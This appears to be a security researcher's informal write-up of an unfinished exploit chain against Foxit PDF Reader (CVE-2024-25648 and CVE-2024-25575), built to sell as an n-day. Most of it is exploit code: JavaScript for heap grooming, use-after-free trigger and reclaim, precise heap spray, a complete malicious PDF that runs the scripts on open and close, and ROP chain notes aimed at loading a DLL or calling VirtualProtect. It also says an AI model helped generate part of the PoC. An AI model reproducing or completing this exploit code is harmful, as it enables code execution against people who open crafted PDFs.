# HackerLife.exe
Write up about an exploit  chain failed to be fully weaponised and experience when trying to tryin to sell your first nday.

So what this story about ? Our quote on qute "life experience in 2025 as young security researcher trying to make in in a ever changing and compilated environment". When 2025 hit some even happened in my life which propmted me to try to somehow make some cash. Unf. to this day this was never the case since i faile misserably as you'll see. Such the team decided to try to utilize our skills. We were contacted by a person on a ssn. When this person reach us they presented themselves as an upcoming start-up which was in cybersecurity from a part of the world this country being part of mnna, so a nato friend(tring not to leave to many details about this person as they are irrelevant anyway). They reached us because they were looking for a person to help imrpove their product a metasploit preium framework sorts of, so basically they were in need of ndays for their framework. To which we replyed happly that we will help again a certain ammount of money.(again irrelevant as still the transaction never came to be). Such we propposed a series of potentials cve we tought we could use to produce an exploit in a month and a-half. you can take a look at the proposed product here.[catalogue_final.pdf](https://github.com/user-attachments/files/19785140/catalogue_final.pdf) . Anyway here comes the first important lesson for youngsters who wanna dabble in cyber. When choosing a cve do take like 3-4 weeks to review the cve prior to starting the research. In the said catalogue you'll be able to find that one of the exploits was a chain , a pdf one.... We looked briefly only at the descriptions ran the provided poc once or twice and took a look at what cwe was and decided that hey we might be able to turn this into a fully weaponsied exploit. We couldn't be further from the truth.
Becasue sometimes life happens i had an exam to pass and we decided that we will get started on working on the actual exploit on 20th of february.
20th of february comes and we start working on the exploit. We start with something "relatively easy"(please do note the sarcasm), we start wtih CVE-2024-25648. But before we even got started working on that we started to try to understand the structure of pdfs or better said just get a little overview into them as you'll see later in the document we'd have to crash a "propper document" with different actions that were triggered when certain events happened. Such we can give a shoutout to ange albertini for documenting this shit properly. Here are the resouces we used to understand the structure of pdf https://www.youtube.com/watch?v=q6KgFezu8tw , https://www.youtube.com/watch?v=8g6G96nn7Mo , https://www.youtube.com/live/xZPK04a5ltc . Why is even that relevant ? Honestly i forgot but we decided that for this chain one part of the exploit will run in background whenever you open the pdf and the second part whenever you close it. Ideely the exploit was supposed to exploit CVE-2024-25648 when closed and CVE-2024-25575 and opened. To break it down in order for us to be able to create a precise memory layout for the uaf precise exploitation we needed and info-leak for computing addresses for ROPgadgets. Such the flow of the exploit would have been: type conf ->infoleak --> gc to clear the layout of heap --> spray precise -->uaf -->eip control -8 --> stackpivot -->ropchiain --> sc --> pop calc.exe . At the current stage you only have the uaf and heap spray  and theoretically(not tested) 2 proposed ropchains. Now withouth going too much into details one crucial part of any uaf exploitation is obviously an "allocator primitive". What is that ? Simply put something that allows you to have control over the content and size you desire to allocate. Now we were lucky enough that there were other people who did some reascher on this topic. Such we used https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672#jit-spraying-to-rescue-bypassing-dep-aslr-at-once as a starting base. So we knew we had to start our research based on something like 
function reclaim(size, count){
3    for (var i = 0; i < count; i++) {
4        sprayArr[i] = new SharedArrayBuffer(size);
5        var rop = new DataView(sprayArr[i]);
6
7        // control value for - call dword ptr [eax+74h]
8        // first dword is pointer to the shellcode
9        rop.setUint32(0, 0x41414141);
10
11        for (var j = 4; j < rop.byteLength/4; j+=4) {
12            rop.setUint32(j, 0x42424242);
13        }
14    }
15} but we didnt know what to do exactly. So we went back read the advisory and than tried to find the size of vulnerable object. How did we do that ? honestly by pure luck. We had some hooks inserted into RlptFreeHeap Math.atan, Math.sin and finally RtlAllocateHeap.(sorry they are junking during the research we somehow lost them). Insert picture here with trace of objects. So after looking for some pattern in memory allocation we concluded that the size of vulnerable object was 0x70. Now what we did further was to try to reclaim the object.Generally speaking when exploiting uaf there are 2 prerequisite for you to controll said object:1. know the size and 2.be able to place a newly allocation in between the free and reuse, and that's what we did. As you can see 
function uaf() { 
  // prepare heap
  var count = 1000;
  var tArr = [];
  
  start("enabling the heap hook");
  app.activeDocs[0].addField('aaaa', "combobox", 2, [13,8,0,19] ) ;
  
  getField('aaaa').setAction("Format",'delete_pages();');
 
  app.activeDocs[0].addField('aaaa', "combobox", 0, [13,8,0,19] ) ;

  end("disabling the heap hook");
}

function delete_pages() {
  app.activeDocs[0].deletePages();
  //reclaim(theSize,0x10000);

  reclaim(theSize,0x300,sprayArr2);

  app.activeDocs[0].deletePages();
  reclaim(theSize,0x300,sprayArr2);

}

we place in between the deltepages which what to see delete stuff , we put re allocation of our said object. And lord behold inser image of 41414141 EIP control. Now we were talking earlier about an exploit flow or the exploit arhitecture stand point, and we mentioned a fact that we wanted to call gc to clear the heap. Well withouth going into detail too mmuch for people who are not familiar on how once could call gc to clear his heap state, one method cause there are many is to create a very big object a few times and he would be done.
Now the actual implementation of this was this one function gc(){
	const maxMallocBytes = 128 * 0x100000; //check if this is true ????
	for(var i = 0 ; i < 3 ; i++){
		var x = new SharedArrayBuffer(maxMallocBytes);
	}
}

nothing new under the sun just wanted to point a quick fact about the implementation of this thing. Now there is another one more thing to talk about since the exploit is targeting a 32 bit software. On windows there is this concept of precise heap spray. So what is that ? On windows(i know it should be also doable on linux, i saw it only on windows) only you can allocate for 32bit space a predictable address every time. Honestly this is nothing new under the sun. It's something easy once you understand it , i did udnerstand it intriquetly once but now i dont :))). Now anyway so for windows 10 you are not allowed to do VirtualAlloc size for VABlocks 0x7fb0. But fortunatelly you can do a trick. You can do incrementally in size of 0x10000, 0x40000 and another size allocation and idk for 0x300 times. This allows you do to it . Againt nothing new under the sun if you know you know. Now here's the specific implementation.
function store_shellcode() {
	app.alert(util.printf("Uninitialized1"));

	var offset 	  		= 0xbc4; //this will need adjustment aka be changed
	var final_payload 		= "";
	var junk 	  		= p32(0x50505050)+p32(0x80808080);
	var rop  	  		= "4141424243434444454546464747";
	var shellcode 		        = "0c0c00c0c0c0c0c0c0c0c0c0c0c0";
	while(junk.length < 0x1000){
		junk += junk;
	}
	app.alert(util.printf("Uninitialized2"));
	app.alert("Preparing layout to allow application to store 'noise'");
	
	// Allocate a 0x1000-byte buffer and fill with 'A'
	let hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a 0x10000-byte buffer and fill with 'B'
	let hAlloc1 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc1, 'B');
	
	// Reallocate hAlloc0 with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate another 0x10000-byte buffer and fill with 'B'
	let hAlloc2 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc2, 'B');
	
	// Reallocate hAlloc0 again (0x1000-byte) and fill with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a third 0x10000-byte buffer and fill with 'B'
	let hAlloc3 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc3, 'B');
	
	// Reallocate hAlloc0 once more with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	app.alert("Layout created, now freeing 3 chunks of 0x10000");
	
	// Log and "free" the 0x10000-byte buffers by dropping references.
	app.alert("Free", hAlloc1);
	hAlloc1 = null;
	
	app.alert("Free", hAlloc2);
	hAlloc2 = null;
	
	app.alert("Free", hAlloc3);
	hAlloc3 = null;
	
	app.alert("Done. Ready for spray");

	//Trigger the theoretical garbage collection to clear the heap.
	gc();

	final_payload =  junk.substring(0,offset);

	final_payload += rop;

	final_payload += shellcode;

	final_payload += junk.substring(0,0x10000-offset-rop.length-shellcode.length);

	while(final_payload.length < 0x40000){
		final_payload += final_payload;
	}
 
  	var sprayRepeat = 3; // Repeat spray multiple times.
  	var sprayCount = 0x900; // Number of spray entries per repetition.

 	for (var rep = 0; rep < sprayRepeat; rep++) {
    		for (var i = 0; i < sprayCount; i++) {
      			// Convert the first 0x40000 characters of final_payload into a SharedArrayBuffer.
      			var sprayBuffer = allocateSprayBuffer(final_payload.substring(0, 0x40000));
      			global_address_spray.push(sprayBuffer);
    		}
  	}
	app.alert(util.printf("SPRAY DONE"));
}

Nothing new under the sun repeat same payload from 0x10000 to another 0x10000 till you form a 0x40000 hex len string and than literally spray it . Now i have to mention that this is somewhat buggy cause while it spray a lot and from time to time we manage to get a precise address, this needs a little bit of optimisation/ improvement cause oh well i forgot how you do this thing exactly.  Insert windbg image and some explanation on what i see 

Now before we close the chapter it would be worther to mention how did we create the hooks for Math.atan, Math.sin and RlptFreeHeap/RtlpAllocateHeap. Well for the rtlp function i had some hooks from when i attented some exploit dev training which deald with foxit an older version. For Math.atan, Math.sin ruben....(insert explanation). Such we came with this(insert hooks) (insert image windbg + explanation on what happens there).

Now for second part of the blog CVE-2024-25575

Withouth going too much into the details of the actual talos write up, ruben had me after 2 weeks when we set sight on the second part of the bug warned me that this might not be exactly a type confusion bug, but rather a uaf which has as side effect type confusion on string. regardless this sounds a good scenario for an exploit dev. Not really. So from the getgo you are left from here

  var lock_object = app.activeDocs[0].addField( 'AA', "signature", 0, [10,214,3] ).getLock() ;

  app.activeDocs[0].deletePages();

  app.fs.transitions;

  lock_object.__defineGetter__('fields', function () {}); 

and you next object is to see how the actual french toast you replace app.fs.transitions. Now at this point in time me and ruben spend like 3 weeks ripping our hairs trying to figure because from adobe docs app.fs.transitions is an object which is only readable and not writable(NOT A GOOD SIGN FOR EXPLOITATION). Second we couldn't determine properly the size of app.fs.transitions with the hook. Why you might ask ? Well even tho we were lucky enough to be able to determine in prev part here we just had bad luck when we realised the size parameter in this case didnt correspond to the hooks and such we couldn't properly deterimne the exact size. Now how did we get out of this mess ? Well in those 3 weeks that have goone by we saw one day on twitter that someone released an MCP server for ghidra/ida and we said we'd give it a try. After i think a day or two arguing with claude somehow it generated this monstrosity.
[message.txt](https://github.com/user-attachments/files/19786160/message.txt)%PDF-1.5 

1 0 obj
<<
	/Type /Catalog 
	/Pages 2 0 R 
	/OpenAction 4 0 R 
	/AA << 
		/WC 3 0 R  
	>> 
endobj

2 0 obj
<<
	/Type /Pages 
	/Count 7
	/Kids [5 0 R 6 0 R 7 0 R 8 0 R 9 0 R 10 0 R 11 0 R] 
>>
endobj 

3 0 obj
<<
	/S /JavaScript 
	/JS(


//var sprayArr = [];
var sprayArr2 = [];

var theSize = 0xb8-8;
function start(msg) {
    Math.atan(msg);
}

function end(msg) {
    Math.acos(msg);
}


function fillBuffer(buffer, char) {
  var dv = new DataView(buffer);
  var charCode = char.charCodeAt(0);
  for (var i = 0; i < buffer.byteLength; i++) {
    dv.setUint8(i, charCode);
  }
}

function reclaim(size, count,array) {
  for (var i = 0; i < count; i++) {
    array[i] = new SharedArrayBuffer(size);
	fillBuffer(array[i], 'B');
  }
}

function addrToHex(addr) {
    return "0x" + addr.toString(16).padStart(8, '0');
}


// Function to create a controlled string pattern
function createStringPattern(length) {
    var result = "";
    for (var i = 0; i < length; i += 4) {
        // Create predictable 4-byte patterns
        var val = 0xAA000000 + i;
        var c1 = String.fromCharCode((val & 0xFF));
        var c2 = String.fromCharCode((val >> 8) & 0xFF);
        var c3 = String.fromCharCode((val >> 16) & 0xFF);
        var c4 = String.fromCharCode((val >> 24) & 0xFF);
        result += c1 + c2 + c3 + c4;
    }
    return result;
}



function type_conf() { 
    app.alert("Starting alternative exploitation approach...");
    
    // Step 1: Create several different types of form fields
    var fields = {};
    var fieldTypes = ["text", "checkbox", "radiobutton", "combobox", "listbox", "signature"];
    
    for (var i = 0; i < fieldTypes.length; i++) {
        try {
            fields[fieldTypes[i]] = app.activeDocs[0].addField(
                'Field_' + fieldTypes[i], 
                fieldTypes[i], 
                0, 
                [10, 50 + i*40, 100, 80 + i*40]
            );
            app.alert("Created " + fieldTypes[i] + " field");
        } catch (e) {
            app.alert("Error creating " + fieldTypes[i] + " field: " + e);
        }
    }
    
    // Step 2: Store references to various objects from these fields
    var objects = [];
    try {
        // Get various objects from different field types to increase chances of success
        if (fields.signature) objects.push({name: "signature.lock", obj: fields.signature.getLock()});
        if (fields.text) objects.push({name: "text.value", obj: fields.text.value});
        if (fields.combobox) objects.push({name: "combobox.items", obj: fields.combobox.items});
        if (fields.checkbox) objects.push({name: "checkbox.style", obj: fields.checkbox.style});
        
        app.alert("Stored references to " + objects.length + " objects");
    } catch (e) {
        app.alert("Error storing object references: " + e);
    }
    
    // Step 3: Call deletePages() with specific parameters
    try {
        app.activeDocs[0].deletePages({nStart: 0, nCount: 0});  // Try not to delete any pages
        app.alert("deletePages called with parameters");
    } catch (e) {
        app.alert("Error in deletePages: " + e);
        // Continue anyway
    }
    
    // Step 4: Create controlled heap objects
    var stringObjects = [];
    var bufferObjects = [];
    
    // Mix of different object types to influence heap layout
    for (var i = 0; i < 100; i++) {
        stringObjects.push("Memory" + i.toString(16).padStart(8, '0'));
    }
    
    // Create objects with specific values that might be recognizable if leaked
    for (var i = 0; i < 20; i++) {
        var obj = {
            marker: 0xABCD0000 + i,
            index: i,
            name: "Marker" + i
        };
        bufferObjects.push(obj);
    }
    
    // Step 5: Access transitions and other APIs to influence memory
    try {
        // Access app.fs.transitions
        app.fs.transitions;
        app.alert("Transitions accessed");
        
        // Access other properties that might influence memory
        if (app.fs.fonts) app.alert("Fonts accessed");
        if (app.fs.templates) app.alert("Templates accessed");
    } catch (e) {
        app.alert("Error accessing app properties: " + e);
    }
    
    // Step 6: Trigger JavaScript garbage collection
    try {
        for (var i = 0; i < 3; i++) {
            var largeArray = new Array(1000000);
            largeArray = null;
        }
        app.alert("Garbage collection potentially triggered");
    } catch (e) {
        app.alert("Error triggering GC: " + e);
    }
    
    // Step 7: Examine objects for signs of corruption or memory leaks
    var results = [];
    
    for (var i = 0; i < objects.length; i++) {
        var objName = objects[i].name;
        var obj = objects[i].obj;
        
        results.push("Examining " + objName + ":");
        
        try {
            // Check object type
            results.push("- Type: " + typeof obj);
            
            // Try to convert to string
            var asString = String(obj);
            results.push("- String representation: " + asString);
            
            // Look for patterns that might indicate addresses
            var hexMatches = asString.match(/[0-9A-Fa-f]{6,}/g);
            if (hexMatches) {
                for (var m = 0; m < hexMatches.length; m++) {
                    results.push("- Potential address: 0x" + hexMatches[m]);
                }
            }
            
            // Try JSON serialization with error handling
            try {
                var asJson = JSON.stringify(obj);
                if (asJson && asJson.length > 2) {  // Not empty object
                    results.push("- JSON: " + (asJson.length > 50 ? asJson.substring(0, 50) + "..." : asJson));
                }
            } catch (jsonError) {
                results.push("- JSON error: " + jsonError);
            }
            
        } catch (e) {
            results.push("- Error examining object: " + e);
        }
    }
    
    // Report results
    for (var i = 0; i < results.length; i++) {
        app.alert(results[i]);
    }
    
    app.alert("Alternative exploitation completed");
}







type_conf();


		


	)
>>
endobj

4 0 obj
<<
	/S /JavaScript 
	/JS(

/*
ROP

FoxitPDFReader!CryptUIWizExport+0x357b1:
00d7e62f 8b01            mov     eax,dword ptr [ecx]  ds:002b:12d3c4a0=f0f0f0f0 ; <---------------- [6]
00d7e631 8b4044          mov     eax,dword ptr [eax+44h] ds:002b:f0f0f134=???????? ; <---------------- [7]
00d7e631 8b4044          mov     eax,dword ptr [eax+44h]
00d7e634 ffd0            call    eax

we got 0x44 till we have to jump and such
so basically we control ecx and in ecx we put the rest of ropchian

and in ecx we put 0c0c0c0c and at 0c0c0c0c we put ropchian

at 0c0c0c0c+0x44 0x4a2a06: xchg esp, ecx ; ret ; (1 found)
such


arr[0]=0x4a2a06 xchg esp, ecx ; ret ; (1 found)(offset 000a2a06) aka ecx
ImageBase                : 0x00400000 


rop[1] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[2] = 0x6c6c642e
rop[3] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[4] = 0x6b636168
rop[5] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[6] = 0x5x706f74
rop[7] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[8] = 0x6b736544
rop[9] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xa] = 0x5c64616c
rop[0xb] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xc] = 0x565c7372
rop[0xd] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xe] = 0x6573555c 
rop[0xf] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0x10] = 0x4141433a
rop[0x11] = 0x4573426: mov edi, esp ; ret ; (1 found)
rop[0x12] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x13] = 0x2
rop[0x14] = 0x30bcb93: add edi, eax ; ret ; (1 found)
rop[0x15] = 0x41a07e: push edi ; ret ; (1 found)
rop[0x16] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x17] = 05254630  76481100 KERNEL32!LoadLibraryAStub - 0xd
rop[0x18] = 0x35f252a: add eax, 0x0C ; mov eax,  [eax] ; ret ; (1 found)
rop[0x19] = 0x370d27c: inc eax ; push eax ; ret ; (1 found)


cause we dont have writeprocessmemory so we result to loadlibrarya


43 3A 
eq to 
C:\Users\Vlad\Desktop\hack.dll

0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)

or in case we want virtualrpotect chain as payload

# skeleton  = RopChain()
# skeleton += 0x41414141                # VirtualAlloc address
# skeleton += 0x42424242                # shellcode return address to return to after VirtualAlloc is called
# skeleton += 0x43434343                # lpAddress (shellcode address)
# skeleton += 0x44444444                # dwSize (0x1)
# skeleton += 0x45454545                # flAllocationType (0x1000)
# skeleton += 0x46464646                # flProtect (0x40)

rop[0x1] = 0x4573426: mov edi, esp ; ret ; (1 found)
rop[0x2] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x3] = 0x2 #this needs to be changed to point to shellcode
rop[0x4] = 0x30bcb93: add edi, eax ; ret ; (1 found)
rop[0x5] = 0x41a07e: push edi ; ret ; (1 found)
rop[0x6] = 0x41a07e: push edi ; ret ; (1 found) since it's the same 
rop[0x7] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0x8] = size for shellcode here
rop[0x9] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xa] = 0x1000
rop[0xb] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xc] = 0x40
rop[0xd] = 04bc457c  76466b30 KERNEL32!VirtualProtectStub - 0xd
rop[0x10] = 0x35f252a: add eax, 0x0C ; mov eax,  [eax] ; ret ; (1 found)
rop[0x11] = 0x370d27c: inc eax ; push eax ; ret ; (1 found)


*/




var global_address_spray = [];

function p32(num) {
  return String.fromCharCode(num & 0xff) +
         String.fromCharCode((num >> 8) & 0xff) +
         String.fromCharCode((num >> 16) & 0xff) +
         String.fromCharCode((num >> 24) & 0xff);
}



function start(msg) {
    Math.atan(msg);
}

function end(msg) {
    Math.acos(msg);
}

function gc(){
	const maxMallocBytes = 128 * 0x100000; //check if this is true ????
	for(var i = 0 ; i < 3 ; i++){
		var x = new SharedArrayBuffer(maxMallocBytes);
	}
}

function allocateSprayBuffer(payload) {
  // Create a SharedArrayBuffer sized to hold the payload.
  // Assuming one byte per character (e.g. for ASCII-only data).
  var buffer = new SharedArrayBuffer(payload.length);
  var dv = new DataView(buffer);
  for (var j = 0; j < payload.length; j++) {
    dv.setUint8(j, payload.charCodeAt(j));
  }
  return buffer;
}


 

function store_shellcode() {
	app.alert(util.printf("Uninitialized1"));

	var offset 	  		= 0xbc4; //this will need adjustment aka be changed
	var final_payload 		= "";
	var junk 	  		= p32(0x50505050)+p32(0x80808080);
	var rop  	  		= "4141424243434444454546464747";
	var shellcode 		        = "0c0c00c0c0c0c0c0c0c0c0c0c0c0";
	while(junk.length < 0x1000){
		junk += junk;
	}
	app.alert(util.printf("Uninitialized2"));
	app.alert("Preparing layout to allow application to store 'noise'");
	
	// Allocate a 0x1000-byte buffer and fill with 'A'
	let hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a 0x10000-byte buffer and fill with 'B'
	let hAlloc1 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc1, 'B');
	
	// Reallocate hAlloc0 with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate another 0x10000-byte buffer and fill with 'B'
	let hAlloc2 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc2, 'B');
	
	// Reallocate hAlloc0 again (0x1000-byte) and fill with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a third 0x10000-byte buffer and fill with 'B'
	let hAlloc3 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc3, 'B');
	
	// Reallocate hAlloc0 once more with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	app.alert("Layout created, now freeing 3 chunks of 0x10000");
	
	// Log and "free" the 0x10000-byte buffers by dropping references.
	app.alert("Free", hAlloc1);
	hAlloc1 = null;
	
	app.alert("Free", hAlloc2);
	hAlloc2 = null;
	
	app.alert("Free", hAlloc3);
	hAlloc3 = null;
	
	app.alert("Done. Ready for spray");

	//Trigger the theoretical garbage collection to clear the heap.
	gc();

	final_payload =  junk.substring(0,offset);

	final_payload += rop;

	final_payload += shellcode;

	final_payload += junk.substring(0,0x10000-offset-rop.length-shellcode.length);

	while(final_payload.length < 0x40000){
		final_payload += final_payload;
	}
 
  	var sprayRepeat = 3; // Repeat spray multiple times.
  	var sprayCount = 0x900; // Number of spray entries per repetition.

 	for (var rep = 0; rep < sprayRepeat; rep++) {
    		for (var i = 0; i < sprayCount; i++) {
      			// Convert the first 0x40000 characters of final_payload into a SharedArrayBuffer.
      			var sprayBuffer = allocateSprayBuffer(final_payload.substring(0, 0x40000));
      			global_address_spray.push(sprayBuffer);
    		}
  	}
	app.alert(util.printf("SPRAY DONE"));
}


var sprayArr = [];
var sprayArr2 = [];

var theSize = 0x70-8;


function fillBuffer(buffer, char) {
  var dv = new DataView(buffer);
  var charCode = char.charCodeAt(0);
  for (var i = 0; i < buffer.byteLength; i++) {
    dv.setUint8(i, charCode);
  }
}

function reclaim(size, count,array) {
  for (var i = 0; i < count; i++) {
    array[i] = new SharedArrayBuffer(size);
	fillBuffer(array[i], 'B');
  }
}

function uaf() { 
  // prepare heap
  var count = 1000;
  var tArr = [];
  
  start("enabling the heap hook");
  app.activeDocs[0].addField('aaaa', "combobox", 2, [13,8,0,19] ) ;
  
  getField('aaaa').setAction("Format",'delete_pages();');
 
  app.activeDocs[0].addField('aaaa', "combobox", 0, [13,8,0,19] ) ;

  end("disabling the heap hook");
}

function delete_pages() {
  app.activeDocs[0].deletePages();
  //reclaim(theSize,0x10000);

  reclaim(theSize,0x300,sprayArr2);

  app.activeDocs[0].deletePages();
  reclaim(theSize,0x300,sprayArr2);

}


//start("enabling the heap hook");
//end("disabling the heap hook");

  //sprayArr[i] = new SharedArrayBuffer(theSize);
reclaim(theSize,0x400,sprayArr);
  for(var i = 0; i < 0x400; ++i){
   if(i%2 == 0){
    	sprayArr[i] = null;
    }
  }	



//store_shellcode();
//uaf();
//console.show();
)>> 


5 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
6 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
7 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
8 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
9 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
10 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
11 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj

trailer 
<< 
	/Root 1 0 R  
	/Size 12 
>>

startxref 

%%EOF

Now what we did was we did i guess you can call it regression testing , where ruben took this poc and started ripping it apart line by line
